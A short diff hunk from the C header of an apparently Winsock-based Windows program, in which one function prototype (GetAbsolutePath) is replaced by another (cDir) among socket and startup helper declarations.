@@ -32,7 +32,7 @@ void WSAReportError(void);
 //=====================
 void sockprintf(SOCKET sock, const char* words, ...);
 char* UserPC();
-void GetAbsolutePath(char* file, char* pathbuf[MAX_PATH]);
+char* cDir();
 // Start Winsock
 void StartWSA(void);
 void fhdawn_main(void);
